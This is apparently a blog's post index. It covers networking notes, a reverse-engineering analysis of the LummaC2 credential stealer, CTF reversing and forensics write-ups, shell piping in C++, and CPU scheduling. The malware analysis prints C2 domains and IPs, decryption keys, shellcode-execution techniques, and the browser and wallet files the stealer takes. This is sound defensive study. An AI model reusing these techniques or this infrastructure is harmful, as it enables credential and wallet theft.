[
  
  {
    "title": "Networking - Part 3",
    "url": "/posts/Networking-Part-3/",
    "categories": "Blogs, Networking",
    "tags": "Computer Networking",
    "date": "2025-08-11 06:21:40 +0530",
    





    
    "snippet": "Hey everyone! Welcome back to the third part of networking. In this blog, I will be covering the requirements (related to networking) that will be needed to get a clear understanding of the DevOps....",
    "content": "Hey everyone! Welcome back to the third part of networking. In this blog, I will be covering the requirements (related to networking) that will be needed to get a clear understanding of the DevOps. So, let’s start…SwitchingIt is how a network switch moves data between devices inside the same local network.Let’s understand switching in a simpler way:  Each network device has a unique MAC address.  When a switch gets a data, it looks for the MAC address of the destination.  It checks its MAC address table (like a contacts list) to know which port that MAC address is connected to.  It then sends the data to that device only, (not to every device)  If it doesn’t know the destination MAC, it broadcasts (temporarily) to everyone.The main difference between switch and hub is -Hub broadcasts the data to all connected devices while switch boradcasts the data selectively through MAC-IP address table.Some important commandsip link : It shows information about your network interfaces at the  data-link layer (of the OSI model). It does not show any IP addresses (both IPv4 and IPv6), only MAC addresses details.ip addr : It is similar to ip link but it also shows information about the IPs assigned to each interface.It does not remove the old address, but will be reset after reboot if the changes are not made in network configuration files.ip addr add 192.168.8.10/24 dev eth0 : This command adds 192.168.8.10 with a subnet of 24 to the eth0 interface.RoutingRouting is the way of deciding the best path for the data packets to move between networks, based on the routing tables. In switching, the movement is within the same network.So, switching is like moving between rooms inside the same building while routing is like finding the best road to another building across town.Let’s understand this diagram.I want to send data from device B to device C. Just connecting the router between the network will make it work ??The answer is No. Because router is just a device and there can be many other such devices, and in that case it will be more difficult for device B to  send data to device C. So, here comes the solution, gateway. We configure the systems with the gateway or a route. We’ll come back to the solution once we understand gateway and routes clearly.We can think like in this way, if a network is a room then gateway is like a door to the other networks.GatewayIt is a specific node (IP address) that a device uses as the exit point from its own network to reach another network.The gateway acts as a route to any network outside your own local network. To see the existing routing configuration on your system, use command route or ip route.This is the routing information you can see in the above image.  Destination means the network for which this route is defined.  Genmask means subnet here  Iface means the network interface, (wlp1s0 for wifi, docker0 for docker-bridge)  Flags shows about the status of gateway. U means the route is UP, G means route uses a gatewayWhat does 0.0.0.0 mean ?It means there is no need of any gateway. Send the data directly to destination that is local and reachable.So, now how can we send the data from device B to C? The solution is, we have to add a route to the IP routing table. ip route add 192.168.2.0/24 via 192.168.1.1 this commands add a route with a destination network 192.168.2.0/24 and gateway 192.168.1.1 on dev ice B. Similarly, we need to add a route on device C too.ip route add 192.168.1.0/24 via 192.168.2.1Now, the connection is established, device B and C can communicate with each other.Let’s look at the another case.I want to setup a connection between device A and C. Your answer will be adding the route on device A and device C, as we did in the previous case.  ip route add 192.168.2.0/24 via 192.168.1.6 on device A  ip route add 192.168.1.0/24 via 192.168.2.6 on device BBut, is it sufficient to establish the connection between them? The answer is No. In the figure, B is connected to both the devices A and C via eth0 and eth1 network interfaces. Due to security reasons, packets are not forwarded from one interface to another interface, and this setting is generally set as default in linux systems.cat /proc/sys/net/ipv4/ip_forward- with this command we can see if forwarding the packets is allowed if the value is set to 1, and if set to 0, means that forwarding the packets in not allowed."
  },
  
  {
    "title": "Reversing LummaC2 Stealer",
    "url": "/posts/Reversing-LummaC2-Stealer/",
    "categories": "Blogs, Malware, Analysis",
    "tags": "Malware Analysis, reversing",
    "date": "2025-01-19 06:21:40 +0530",
    





    
    "snippet": "Hi again! In this blog, I have reversed a malware containing LummaC2 stealer.Basic Analysis      First, let’s analyse the malware on VirusTotal     SHA-256 of the file is: c5fd4ee7fef2655d5340221a2...",
    "content": "Hi again! In this blog, I have reversed a malware containing LummaC2 stealer.Basic Analysis      First, let’s analyse the malware on VirusTotal     SHA-256 of the file is: c5fd4ee7fef2655d5340221a2fe4990d0b744720fdb0b0530599b376c913bf7e  The original name of the binary is Handler.exe and it’s a .NET executable  Looking at the strings, lot of base64 encoded strings are present, it suggests there may be some kind of string obfuscation.Static Analysis      For analysing the malware, I used dnSpy as our malware is .NET executable.    WinAPIs like VirtualProtect and CallWindowProcA are present: it suggests the presence of shellcode. So, it leverages the VirtualProtect call to make the shellcode memory region executable and abuses the CallWindowProc API to execute the shellcode.  Program.VirtualProtect(ref Program.inputData[0], Program.inputData.Length, 64U, ref num); Taking references from Microsoft docs, third param is flNewProtect: memory protection option, and here 64 is being passed that is PAGE_EXECUTE_READWRITE. It confirms inputData is the shellcode.      Let’s look at NormalizeListing    This function implements RC4 encryption algorithm.  DataKey is : { 92, 102, 121, 128, 113, 104, 212, 200, 111, 37, 50, 69, 96, 76, 234, 96, 208, 253, 98, 100, 81, 137, 30, 48, 163, 184, 164, 191, 123, 212, 74, 195, 119, 36, 4, 61} -&gt; The key for RC4 decryption of shellcode  Similarly, inputData (or shellcode) and key for decrypting sectionContent are also hardcoded. This above code is the part of the Main function. It extracts the binary path and then checks for MZ and PE headers for a valid PE file.  There is a loop where a string is encoded as base64 and comapared.  From Program.SectionContent, it seems program sections names like .text, .reloc, .rsrc and .idata are being compared and if the check passes, data is copied of that section.  It seems, this is a packed malware, which will be decrypted with RC4 and then executed.  We can verify this using the debugger.Dynamic Analysis  Now, let’s try to analyse the behaviour of the malware.  Run the binary in the sandboxed environment only, to avoid any undesirable consequences.  So, first it checked for s = \".idata\" (base64 string was LmlkYXRh) and then it copied the data from 0xf000 to 0x5bbff (offsets of the binary), data length is 0x4cc00  Now, reversing SecureData, in first call of NormalizeListing, .idata data is being passed along with the key (length: 0xA)  Key is:- [0xA, 0xB, 0x1, 0x12, 0x0C, 0x57, 0x88, 0x0B, 0xFF, 0x0C]  In second call of NormalizeListing, now inputData (shellcode) is being passed along with the key (length: 0x24) [Key already mentioned in above block]      Our both data are decrypted with RC4 now and another PE file (packed binary) comes out. Let’s try to analyse it.    Running floss on this PE file, gives some interesting results:    Content-Disposition: form-data; name=\"    Content-Type: attachment/x-object    Content-Disposition: form-data; name=\"file\"; filename=\"    hwid    send_message    Eact    file    Content-Type: multipart/form-data; boundary=    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36    \\Last Version    %Program    pplication\\    advapi32.dll    SeImpersonatePrivilege    winc    json    http://localhost:    \\Local Extension Settings\\    /Extensions/    key4.db    cert9.db    cookies.sqlite    logins.json    formhistory.sqlite    \\key4.db    ole32.dll    LOCK    \\Packages    Thunderb    \\LocalState\\Indexed\\LiveComm\\    .eml    Mails/Windows Mail    DiscordCanary    DiscordPTB    \\Local State    os_crypt.encrypted_key    /dp.txt    Path:     Configuration:     Buy now: TG @lummanowork    Buy&amp;Sell logs: @lummamarketplace_bot    LummaC2 Build: Jan 15 2025    LID:     %SystemDrive%    ROOT\\CIMV2    SELECT * FROM Win32_BIOS    SerialNumber      Debugging it in IDA,   API resolving        Here is the function which decrypts base64 strings (e.g. Bm1NE4MDSBkzp0zZyP6i4LdYDOjfYRjN+sZUfIYz8lxvACB872I8fFDPLbWkm8zO1TdijA==) to the domains:        Malicious Domains captured in Wireshark:     crookedfoshe.bond   strivehelpeu.bond   immolatechallen.bond   growthselec.bond   jarry-deatile.bond   pain-temper.bond   stripedre-lot.bond   jarry-fixxer.bond   culltereddirtys.click  Setting up and communicating with C2 Server  Malicious IP addr: 172.67.131.36 104.21.3.197 172.67.199.224  https://steamcommunity.com/profiles/76561199724331900  Collecting data of Edge Browser Scanning for ‘wallet’ fileScanning for the extensionsConclusion  Binary Packing  Abusing CallWindowsProcA() for shellcode execution.  PEB traversal and API hashing  Setting up C2 server  Using DDR (Dead Drop Resolver) to hide its C2 details on the steam community website.  Contacting malicious domains  Stealing sensitive files like: key4.db logins.json cert9.db os_crypt.encrypted_key and many more.  It targets Browsers, CryptoWallets, Extensions, Messaging Apps (like Telegram, Discord), Email Clients (like Thunderbird, PMAIL, The BAT!) Telegram channel associated with LummaC2.References  https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/"
  },
  
  {
    "title": "BackdoorCTF'24 Writeup",
    "url": "/posts/BackdoorCTF'24-Writeup/",
    "categories": "Writeups",
    "tags": "reversing, Golang",
    "date": "2024-12-23 09:41:40 +0530",
    





    
    "snippet": "Reversing/ GoBlindDescription:This binary hides its secrets deep within. Can you untangle the layers and reveal the secret?File : fileWriteup  This challenge was written in GoLang.  Executing this ...",
    "content": "Reversing/ GoBlindDescription:This binary hides its secrets deep within. Can you untangle the layers and reveal the secret?File : fileWriteup  This challenge was written in GoLang.  Executing this binary (without debugger), requires a password to reveal some super secret as it says.  Giving some random input ( less than 16 chars) says: Invalid Length.  Open the binary in the debugger and there we see a lot of main_* functions.      Start analysing from the main_main and first see the valid length of the input is 16    After length check, we can see the input[11] after some operations is being passed to sync__ptr_WaitGroup_Add().  Let’s reverse the operations being performed on input[11]  res= ((ord(input[11]) &gt;&gt; 2)%10)+2  this res value is being passed to the function sync__ptr_WaitGroup_Add(), it basically keeps the track of how many go_routines are active or need to be completed.  so, res should be equal to no. of go_routines are need to be executed.  to determine the number of executing goroutines, observe calls to runtime_newproc() and track the respective wrapper functions whose pointers are being passed.  In the wrapper functions, functions which is going to be executed within that goroutine.  To clear the check let’s find the possible chars for input[11]      Possible chars - '0' '1' '2' '3' 'X' 'Y' 'Z' '['  -&gt; these 8 possibilities    Let’s look into the first go routine:  PxIuE72uAaCXX3HmXchd this function checks the system year and month.  Year should be 2004 and hash of the month name should be equal to 0xad018838  let’s look at the hash function t5gftiAC:      func t5gftiAC(input string) uint64 {         var hash uint64         for _, c := range input {            hash = (hash*0x1003F + uint64(c)) &amp; 0xffffffff         }         return hash      }  Month name found is July.  Now, since July is the 7th month, so key[7]='N' key[9]='$' key[10]='G'  In this function itself, there is another function CWlj47zuCalSy1YWM that returns bool value.  This seems to be another check. From here, we can see 3 chars of input involved.  input[5]==’G’ is directly observed.  let’s look for 13th and 14th character.  there’s another function called nOsylsKWBryE2UkXS, in which we can see runtime.Callers()-&gt; that calculates the stack depth.  result =((input[13] ^ input[14])&gt;&gt;1)%14  Understand how runtime.Callers work, get the value equal to result.            runtime.Callers()      nOsylsKWBryE2UkXS()      CWlj47zuCalSy1YWM()      PxIuE72uAaCXX3HmXchd()      .go_exit()        The value here will be 5      Again there can be few possibilities, but to pass the check we can proceed further with any possible combination.    second goroutine involves checking chars of file name with chars of input.      exeName[8]==input[8] &amp;&amp; exeName[5]==input[12] =&gt; key[8]='e' and key[12]='.'    3rd goroutine involves the no. of files in the directory in which chall.exe is present and being executed.      No. of files in the directory should be 5 and thus key[6]=='o'    In 4th goroutine, first 5 chars of the key are passed to the function HrjZ1eDoZCypd2kqH and its result is compared to NGZI1mz.  upon taking look at this function, it seems to be some kind of custom base64.  its encoding goes like this:-          it converts each char to 8-bit representation      Xor each 8-bit chunk with 0xAA      padding to 6-bit chunks      bits are reversed in each 6-bit chunk.      order of 6-bit chunks is reversed.      then mapping each 6-bit chunk to the character in the 64 length buffers (like base64).        Decoding it, we can get g0n3! -&gt; these are first five characters of the key.      The results from these goroutines are collected via channels. If all are true, it proceeds; otherwise, it signs out of Windows.        Till now we have the key: g0n3!GoNe$GX.XXX where X are still unknown or unconfirmed.    If all results collected are true then another function R7iQNypRBtbrpyaNq1z is encountered. It looks to have some encrypted buffer. This may be the decryption routine. Let’s dive into it and see what does it unfold?  In function OnkQsAFZuhclKr2sBDT encrypted buffer is being passed and this decryption routine looks like rc6. But, I changed the hardcoded constants used in the standard algo. pw=0xB7E12163  qw= 0x9E3778D9 keeping rest same.  There is no need to reverse this function, it will decrypt the buffer with the right key.  For right key, we still the need rest 4 characters.  Since, all goroutines checks are passed [setting the  required system time and year, keeping the required no of files in the same directory], data.txt file will be created, but it won’t be readable since we don’t have right key yet.  There is a function that should be reversed in depth is Z2JEqRKSdxHoRaSCjUshuqZUVD.  This function loads some buffer and then goes through some routine (that should be some sort of decoding routine) and we can see very useful stuff here like: kernel32.dll VirtualAlloc CreateThread this is enough for us to conclude that it must be involving shellcode.  3 chars from the input, input[5] input[13] input[15] are involved in the shellcode.  that decryption routine invoves first 2 chars of the key. g and 0.         for i in range(len(sc)):            sc[i]= sc[i]-2            sc[i]= sc[i]^ord('g')            sc[i]= sc[i]-1            sc[i]= sc[i]^ord('0')  we already know input[5]=G, we need to find two chars such that our shellcode is fixed.      Find the index where these chars are involved in shellcode.    For key[15]-&gt; 68 42 65 65 70    push 0x70656542 is the correct instruction. Here 0x68 is corresponding to input[15]  For key[13]-&gt; 8b 40 78     mov    eax,DWORD PTR [rax+0x78] Here 0x78 is corresponding to key[13].      Looking at the shellcode carefully, we can find that there is peb_traversal is involved and it finds function with it. Referring to peb_traversal, we can fix key[13].        For key[15], we can see before this instruction, stack is being set up and 0x70656542 -&gt; peeB :- Beep It is pushing this string on the stack. Before this instruction there is xor rsi rsi; push rsi that suggests it is pushing a null-byte to the stack, followed by this peeB -&gt; Beep\\x00        Resources that can be referred to:          https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode      https://defuse.ca/online-x86-assembler.htm#disassembly      Capstone                  i=0x78            i= i^ord('0')            i= i+1            i= i^ord('g')            i= i+2            print(chr(i)) -&gt; It gives '0'                 i=0x68            i= i^ord('0')            i= i+1            i= i^ord('g')            i= i+2            print(chr(i)) -&gt; It gives '@'   Our key is now:- g0n3!GoNe$GX.0X@      str=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/!@#$%^&amp;*.\"       for i in str:          if 5==((48 ^ord(i))&gt;&gt;1)%14:             print(i)this is possible options for key[14]:=  [J K n o r s]  With some permutations: g0n3!GoNe$G0.0n@ [Correct key]      Now with the correct key and other challenge requirements, we can get our data.txt which contains:      Good Job, Mate! Thank you decrypting this file-- means a lot to me.  Your secret is here: \"ZmxhZ3tnMF9yMHV0MW4zc180cjNfYzAwbCEkIX0=\"   Enjoy, happy reversing!            A Beep sound is heard at the end, and binary exits.    Flag is: flag{g0_r0ut1n3s_4r3_c00l!$!}"
  },
  
  {
    "title": "Piping Process In Shell",
    "url": "/posts/Piping-Process-In-Shell/",
    "categories": "Blogs",
    "tags": "Linux, Shell, Computer Systems",
    "date": "2024-05-30 06:21:40 +0530",
    





    
    "snippet": "Hey everyone! Welcome back to my blog series. Recently, I’ve been dedicating time to my basic my-shell project, where I’m working on implementing a shell in C++. While doing so, I got stuck in addi...",
    "content": "Hey everyone! Welcome back to my blog series. Recently, I’ve been dedicating time to my basic my-shell project, where I’m working on implementing a shell in C++. While doing so, I got stuck in adding piping functionality. In this blog, I will be explaining the piping process. So, let’s start with the fundamental question, what is piping?A mechanism or a process through which the output of a command is used as an input for another command. In simpler words, it involves the chaining of the commands, creating a pipeline through which data flows. Pipe operator is denoted by |. Commands in the pipeline are executed sequentially.Pipe has Queue data structure and behaves like FIFO.How piping works  A separate process is created for each command in the pipeline using fork() syscall.  A commiunication channel is setup through pipe (|) between the consecutive commands.  Pipe is unidirectional in nature. pipe() syscall creates a pair of file descriptors: one pointing to the read end and one to the write end.  Each process in the pipeline redirects its standard input (stdin) to read from the read end of the pipe and its standard output (stdout) to write to the write end of the pipe.  As the command is executed, it reads data from the previous command through pipe, processes it and writes the output to the next command in a sequential mannerImplementationLet’s understand how we can implement this mechanism in our shell. First of all, let’s see how shell works in a simple way. It first takes input as a string, then it parses the input into arguments and thus executes the command with help of fork-exec model.What if when pipe is used, for e.g. command1 | command2 | command3. There are multiple commands now, so each command is now need to be parsed and count the number of pipes used.A pipe() syscall gives two file descriptors: pfd[0] for read, and pfd[1] for write  int pipes_count = commands.size() - 1;  int pipefds[pipes_count * 2];       // array to hold file descriptors for pipes  for (int i = 0; i &lt; pipes_count; i++) {    if (pipe(pipefds + i * 2) == -1) {   // initialize pipe        perror(\"pipe\");        return 1;    }  }pipe(pipefds + i * 2): this intialises the two consecutive file descriptors. When i is 0, it initializes pipefds[0] and pipefds[1]. Hence, we have created all the required pipes before forking the processes. Now, fork the processes. Each command will run in its own child process.So, we have input: command1 | command2 | command3. There are two pipes and three commands. There will be four file descriptors, two for each (one for read end and one for write end).  for(int i=0; i&lt; commands.size(); i++)  {    pid_t pid= fork();    if(pid==0)  // child process    {        if (i &gt; 0) { // redirect input from the previous pipe            if (dup2(pipefds[(i - 1) * 2], 0) == -1) {                perror(\"dup2\");                exit(EXIT_FAILURE);            }        }                if (i &lt; commands.size() - 1) { // redirect output to next pipe            if (dup2(pipefds[i * 2 + 1], 1) == -1) {                perror(\"dup2\");                exit(EXIT_FAILURE);            }        }        for (int j = 0; j &lt; 2 * pipes_count; j++) {  // Close all pipe file descriptors            close(pipefds[j]);        }        vector&lt; string&gt; args = parsing_string(commands[i]);          vector&lt; char *&gt; cargs;        for (const auto &amp;arg : args) {            cargs.push_back(const_cast&lt;  char *&gt;(arg.c_str()));        }        cargs.push_back(nullptr);        if (execvp(cargs[0], cargs.data()) == -1) {            perror(\"exec\");            exit(EXIT_FAILURE);        }     } else if (pid &lt; 0) {        perror(\"fork\");   // Error in forking        return 1;      }      }  for (int i = 0; i &lt; 2 * pipes_count; i++) {    close(pipefds[i]);  }Wehn i==0, child process for command1 will be forked. It will write to Pipe1. stdout of command1 will be redirected to Pipe1 write end, dup2(pipefds[1], 1);When i==1, child process for command2 will be forked. It reads from pipe1 and writes to pipe2. dup2(pipefds[0], 0); : redirects stdin of command2 to Pipe 1’s read end and dup2(pipefds[3], 1);: redirects stdout of command2 to Pipe 2’s write end.When i==2, child process for command3 will be forked. It reads from Pipe 2. dup2(pipefds[2], 0) redirects the standard input of command3 to the read end of Pipe 2.After setting up the necessary redirections using dup2, the child process closes all pipe file descriptors. This is because once dup2 has duplicated the file descriptors to stdin (0) and stdout (1), the original pipe file descriptors are no longer needed by this process.After forking all child processes, the parent process closes all pipe file descriptors. This is important because the parent process does not need to use these pipes itself.Closing the file descriptors prevents the resource leakage and ensures the proper functioning of the pipeline.Thus, we have reached at the end of this blog. Thank you for your attention, hope you like it.References  https://www.scaler.com/topics/pipes-in-os/  https://github.com/Sl4y3r-07/my-shell  https://stackoverflow.com/questions/63544779/how-is-pipe-uni-directional-when-we-get-two-file-descriptors-by-calling-pipe-f  https://inst.eecs.berkeley.edu/~cs162/fa21/static/dis/dis2.pdf"
  },
  
  {
    "title": "CPU Scheduling",
    "url": "/posts/CPU-Scheduling/",
    "categories": "Blogs, OperatingSystems",
    "tags": "Operating Systems, Computer Science",
    "date": "2024-04-05 06:21:40 +0530",
    





    
    "snippet": "Hey everyone! This article is about how CPU schedules the processes and executes them, covering various scheduling algorithms. It consists of my notes which I prepared while studying this topic fro...",
    "content": "Hey everyone! This article is about how CPU schedules the processes and executes them, covering various scheduling algorithms. It consists of my notes which I prepared while studying this topic from  operating systems textbook by Silberschatz and Galvin. So let’s start:CPU-I/O burst cycle  process execution consists of a cycle of CPU execution and I/O wait.  process alternate between these two states.  process execution begins with CPU burst and followed by I/O burst, and cycle continues.  An I/O-bound program typically has many short CPU bursts. A CPU-bound program might have a few long CPU burstsCPU Scheduling  Whenever the CPU becomes idle, the OS must select one of the process in the ready queue which is to be allocated to the CPU by CPU scheduler.  Scheduler: Its job is to decide which processes should be allowed to use the CPU and for how long, and schedules into the ready queue and later dispatched for execution by the dispatcher.Preemptive Scheduling Pre-emptive : A running process or thread can be interrupted and moved out of the CPU to allow another process or thread to execute  There are four circumstances where decision is to be taken for CPU rescheduling, when:          Running State to waiting State      Waiting State to Ready State      Running State to Ready State      Process terminates            Scheduling Scheme for 1 and 4 is non preemptive. Unfortunately, preemptive scheduling can result in race conditions when data are shared among several processes.    Preemption also affects the design of the operating-system kernel.Dispatcher      The dispatcher is the module that gives control of the CPU to the process selected by the short-term scheduler        Dispatch Latency : The time between stopping a process and starting another process.        Dispatcher should be fast as much as possible.        Its functions are :          Context Switching      Switching to user mode      Jumping from one location in the program to restart it. [The dispatcher needs to set the program counter (PC) to the appropriate location in the user program, allowing the selected process to resume its execution from where it was previously interrupted]      Scheduling Criteria  Throughput : number of processes per unit time  Turnaround : total time from waiting to completion  Response Time : time from submission of the request till first response  Waiting Time :  the sum of the periods spent waiting in the ready queueScheduling AlgorithmsFirst Come, First Served Scheduling (FCFS)      With this scheme, the process that requests the CPU first is allocated the CPU first. The implementation of the FCFS policy is easily managed with a FIFO queue. When a process enters the ready queue, its PCB is linked onto the tail of the queue. When the CPU is free, it is allocated to the process at the head of the queue. The running process is then removed from the queue.        The average waiting time under an FCFS policy is generally not minimal and may vary substantially if the    processes’ CPU burst times vary greatly.        Convoy Effect: The effect due to which short processes are delayed by longer processes ahead of them in the queue.  Shortest Job-First Scheduling  In this scheduling algo, CPU is assigned to the process that has the smallest next CPU burst. If the next CPU bursts of two processes are the same, FCFS scheduling is used to break the tie.  The real difficulty with the SJF algorithm is knowing the length of the next CPU request. For long-term (job) scheduling in a batch system, we can use the process time limit that a user specifies when he submits the job. In this situation, users are motivated to estimate the process time limit accurately, since a lower value may mean faster response but too low a value will cause a time-limit-exceeded error and require resubmission. SJF scheduling is used frequently in long-term scheduling.  To predict next CPU-cycle burst, we can use exponential average formula.  τ(n+1) = α. Tn + (1-α) . τ(n)  The SJF algorithm can be either preemptive or nonpreemptive  Preemptive SJF scheduling is sometimes called shortest-remaining-time-first scheduling.Priority Algorithm  The SJF algorithm is a special case of the general priority-scheduling algorithm.  An SJF algorithm is simply a priority algorithm where the priority (p) is theinverse of the (predicted) next CPU burst. The larger the CPU burst, the lower the priority, and vice versa.  Priority scheduling can be either preemptive or nonpreemptive.  Problem with priority scheduling algorithms is indefinite blocking, or starvation. A process that is ready to run but waiting for the CPU can be considered blocked. A priority scheduling algorithm can leave some low priority processes waiting indefinitely.  Solution to this problem is aging. That means, priority is increased by 1 in very 15 minutes.Round-Robin Algorithm  This algo is preemptive  A small unit of time, called a time quantum or time slice, is defined. A time quantum is generally from 10 to 100 milliseconds in length.  In the RR scheduling algorithm, no process is allocated the CPU for more than 1 time quantum in a row.Multilevel Queue Scheduling  Five queues, listed below in order of priority:          System processes      Interactive processes      Interactive editing processes      Batch processes      Student processes        The foreground queue might be scheduled by an RR algorithm, while the background queue is scheduled by an FCFS algorithm.   Multilevel Feedback Queue Scheduling  It allows processes to move between queues which makes it flexible, whereas previous algo was not flexible.  If a process uses too much CPU time, it will be moved to a lower-priority queue.  In general, a multilevel feedback queue scheduler is defined by the following parameters:          The number of queues      The scheduling algorithm for each queue      The method used to determine when to upgrade a process to a higher priority queue      The method used to determine when to demote a process to a lower priority queue      The method used to determine which queue a process will enter when that process needs service      Thread SchedulingContention Scope  process contention scope : in this scheme, thread library schedules user-level threads to run on available LWP.  system contention scope: In this scheme, kernel level threads are scheduled to be run on the CPU.POSIX Scheduling  uses pthreads  pthread_scope_system &amp; pthread_scope_process  pthread IPC provides two functions for setting and getting the contention scope policy:          pthread attr setscope(pthread attr t *attr, int scope)      pthread attr getscope(pthread attr t *attr, int *scope)      Multiprocessor Scheduling  Assymmetric multiprocessing: Involves a master processor that has all scheduling descisions, I/O processing and other accesses, while other processors runs the user code only. It is simple  Symmetric multiprocessing: It is bit complex. Each processor is self-schedulingProcessor Affinity  processor affinity is about keeping certain tasks or processes consistently assigned to specific processors, aiming to improve efficiency and overall system performance.  related to cache memory which makes processes faster to execute on CPU.          Soft Affinity :  In soft affinity, a process or thread is recommended to run on a specific processor or a set of processors, but it is not strictly enforced.      Hard Affinity : In hard affinity, a process or thread is strictly bound to execute on a specific processor or a set of processors.        sched setaffinity() system call : can set hard affinityLoad Balancing  It attempts to keep the workload evenly distributed across all processors in an SMP system.  Two general approaches to load balancing :          Push Migration : If found imbalance on one processor, it migrated some load on other processors.      Pull Migration : When an idle processor pulls some load from a busy processor.      Memory Stall  A memory stall refers to a situation in a computer system where the CPU (Central Processing Unit) has to wait for data to be fetched from the memory before it can proceed with its execution. Memory stalls can occur due to various reasons, and they often result in a temporary delay in the execution of instructions.          Cache Miss:  A cache miss occurs when the CPU needs data that is not in the cache.      Memory Latency: accessing data from main memory can introduce latency.      Data Dependencies: the execution of instructions is dependent on the availability of data.      Memory Bus Saturation: is responsible for transferring data between the CPU and RAM, is saturated or experiencing high traffic, it can lead to delays in data transfer, resulting in memory stalls.        Two multithreading approaches:          Coarse-grained: Cost of thread switching is high here. Instruction pipeline must be flused out before switching to othere thread on a processor.      Fine-grained: Cost of thread switching is low.      Real Time CPU Scheduling      Hard and Soft Real-Time Systems: Hard real-time systems have strict and non-negotiable timing requirements. Missing deadline in a hard real-time system is considered a system failure. Soft real-time system have timing constraints that are important but not critical; missing a deadline may no lead to catastrophic failure.    Two types of latencies affect the performance of real-time systems:          Interrupt Latency      Dispatch Latency        Interrupt Latency: from the arrival of an interrupt at the CPU to the start of the routine that services the interrupt.    First, OS completes the instruction which it was running, then, it determines the type of interrupt and then it saves the state before servicing the interrupt.  ISR : Interrupt Service Routine, a software routine, executed in response to the interrupt signal generated by hardware or software.  Dispatch Latency: from the arrival of an interrupt at the CPU to the start of the routine that services the interrupt.  It uses preemptive kernels. Priority Based  Scheduling  admission-approval: In this scheduler either admits the process, guaranteeing that the process will complete on time, or rejects the request as impossible if it cannot guarantee that the task will be serviced by its deadline.Rate-Monotic scheduling  uses static priority policy with preemption.  Uponentering the system, each periodic task is assigned a priority inversely based on its period.  rate-monotonic scheduling assumes that the processing time of a periodic process is the same for each CPU burst. That is, every time a process acquires the CPU, the duration of its CPU burst is the same.  This method may or may not guarantee that the processes will meet their deadlines.  It tries to schedule the processes in such a way that a process meets its deadline.  Shorter the period, higher the priority.Earliest Deadline First Scheduling  This scheduling method assigns priorities based on the deadlines.  Shorter the deadline, higher the priority.  Unlike the rate-monotonic algorithm, EDF scheduling does not require that processes be periodic, nor must a process require a constant amount of CPU time per burst.  The only requirement is that a process announce its deadline to the scheduler when it becomes runnable  Achieving 100% cpu utilisation is impossible, because of the cost of context switching and interrupt handling.Proportional Share Scheduling  In this type, processes are allocated N shares of total T shares of time.  Its schedulers work in conjunction with admission-policy.Finally, it’s time to wrap up. Thank you for your attention. Hope you like this blog."
  },
  
  {
    "title": "BackdoorCTF'23 Writeups",
    "url": "/posts/BackdoorCTF'23-Writeups/",
    "categories": "Writeups",
    "tags": "reversing, Forensics",
    "date": "2023-12-23 09:41:40 +0530",
    





    
    "snippet": "I’m sharing writeups for the challenges I  created for Backdoor CTF’23, hosted by InfoSecIITR. Here they are :-Forensics/HeadacheDescription:-I’ve had a headache since last evening. Is there a magi...",
    "content": "I’m sharing writeups for the challenges I  created for Backdoor CTF’23, hosted by InfoSecIITR. Here they are :-Forensics/HeadacheDescription:-I’ve had a headache since last evening. Is there a magic spell that can cure it immediately?Challenge File:  fileThis challenge was beginner level forensics challenge. A png image is given as the challenge file, which seems to be corrupted. As the name of the chall suggests, we should check the header of the png. Using hexedit, first 8 bytes seems incorrect.Edit correct header bytes 89 50 4E 47 0D 0A 1A 0A and save the file, that reveals the flag.That was ‘s’ not ‘8’, I am sorry, it was bit cursive :)Flag:- flag{sp3ll_15_89_50_4E_47}Forensics/DrunkDescription:- I was offered a famous Italian drink along with a message, but it affected me in such a way that I couldn’t decipher it. Need your help and please don’t make excuse if you can’t.Challenge File: file1 file2In this challenge, something.txt and encoded.bin are provided. In something.txt file, there seems to be some type of encoding, so to figure out this, I use cyberchef. It is octal encoding followed by hex and then base64 encoded. We get zlMg5K3TobbFh_8l7doDT_408rH7Md_W3Oc1yKX1FrA=.Now, the real challenge starts to figure out what encoded.bin is all about. In encoded.bin, data seems to be encrypted. The string we got from something.txt may be the key to decrypt it. Let’s try to get the encryption method. From the description, Italian Drink. Try to google about Italian drinks and some cryptographic encryption methods, Fernet will be the result (Fernet-Branca is an Italian armaro). Though you have to google it hard. Now, it becomes super easy to decrypt the data. This is the following script I used to decrypt the data. from cryptography.fernet import Fernet from PIL import Image import io def decrypt_image(encrypted_image, key):        with open(encrypted_image, 'rb') as file:        encrypted_data = file.read()        f = Fernet(key)    decrypted_data = f.decrypt(encrypted_data)    decrypted_image = Image.open(io.BytesIO(decrypted_data))    decrypted_image.save('decrypted_image.png')     if __name__ == \"__main__\":    encrypted_image = \"encoded.bin\"     encryption_key ='zlMg5K3TobbFh_8l7doDT_408rH7Md_W3Oc1yKX1FrA='    decrypt_image(encrypted_image, encryption_key)Though this challenge involves cryptographic part but forensics is incomplete without cryptographic as all encryption methods use it. Fernet is one of the most common encryption methods used in forensics.Flag:- flag{Th1s_time_n0t_cURs1v3}Rev/Open SesameDescription:- Whisper the phrase, unveil with ‘Open Sesame’.Challenge File: fileAn apk file is provided as the challenge file. First open this apk in  JADX tool to see its source code. After opening the apk in Jadx, navigate to com.example.open_sesame.MainActivity. This app requires UserID and Key, and if they are invalid, Invalid credentials. Please try again.\" will be displayed, but valid UserID and key will not display the flag. For this, understanding the code logic is must. We have few functions here : n4ut1lus, sh4dy, it4chi, sl4y3r and flag.The  valid_password is 4l1baba (from the given ascii codes), and AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR has a constant value 108. Now, it4chi function extracts digits from the password (4,1), sh4dy function appends the digits and return as string (41) and sl4y3r function subtracts 1 from the number (40). Now, in flag function, U|]rURuoU^PoR_FDMo@X]uBUg is xored with 40. This will give us the flag.Flag:- flag{aLiBabA_and_forty_thiEveS}Rev/Sl4ydroidDescription:- This challenge has got some Rizz !!Challenge File: fileThis challenge is based on dynamic debugging of Android Application. Open the app on JADX, and naviagte to com.backdoor.sl4ydroid.MainActivity to see its source code. This app loads a native library named sl4ydroid using System.loadLibrary(). The class declares several native methods damn, k2, kim, nim that are implemented in native code, not in Java. These native methods are invoked within onCreate method of MainActivity class with strings as 